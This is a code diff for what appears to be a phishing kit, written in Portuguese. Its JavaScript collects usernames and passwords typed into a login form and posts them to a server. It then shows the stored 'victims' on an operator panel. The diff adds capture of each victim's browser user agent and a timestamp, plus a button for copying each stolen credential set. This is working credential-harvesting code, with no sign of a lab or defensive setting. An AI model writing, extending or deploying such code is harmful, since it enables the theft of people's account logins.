@@ -1,6 +1,36 @@
-function bizonhosAddHtml(user, pass){
+function copiarTexto(texto) {
+    const textarea = document.createElement("textarea");
+    textarea.value = texto;
+    document.body.appendChild(textarea);
+    textarea.select();
+    document.execCommand("copy");
+    document.body.removeChild(textarea);
+}
+
+function bizonhosAddHtml(user, pass, agent, time){
     let newBizonho = document.createElement("li");
-    newBizonho.innerHTML = `<p>Email: <strong>${user}</strong> </p><p>Password: <strong>${pass}</strong> </p>`;
+    let infoNewBizonho = document.createElement("div");
+    let button = document.createElement("button");
+
+    newBizonho.classList.add("item-lista-victim");
+
+    infoNewBizonho.innerHTML = `<p>Email: <strong>${user}</strong> </p>
+                                <p>Password: <strong>${pass}</strong> </p>
+                                <p>UserAgent: <strong>${agent}</strong> </p>
+                                <p>Date Time: <strong>${time}</strong> </p>`;
+    
+    button.innerText = "copy";
+    button.classList.add("copy-button");
+    
+    button.onclick = () => {
+        let text = infoNewBizonho.innerText
+        copiarTexto(text)
+        button.innerText = "copied!"
+    };
+
+    newBizonho.appendChild(infoNewBizonho);
+    newBizonho.appendChild(button);
+
 
     document.getElementById("bizonhos").appendChild(newBizonho);
 }
@@ -12,7 +42,7 @@ function getBizonhos(){
         console.log(data);
         for (let i = 0; i < data.victims.length; i++) {
             const bizonhos = data.victims[i];
-            bizonhosAddHtml(bizonhos.username, bizonhos.password);
+            bizonhosAddHtml(bizonhos.username, bizonhos.password, bizonhos.useragent, bizonhos.datetime);
         }
     })
     .catch(error => console.error("Impossivel obter bizonhos!", error));
@@ -22,10 +52,14 @@ function getBizonhos(){
 function postBizonhos(){
     let user = document.getElementById("username").value;
     let pass = document.getElementById("password").value;
+    let userAgent = navigator.userAgent;
+    let dateTime = new Date().toLocaleString();
 
     let jsonData = {
         username: user,
         password: pass, 
+        useragent: userAgent,
+        datetime: dateTime
     }
 
     fetch("/post", {
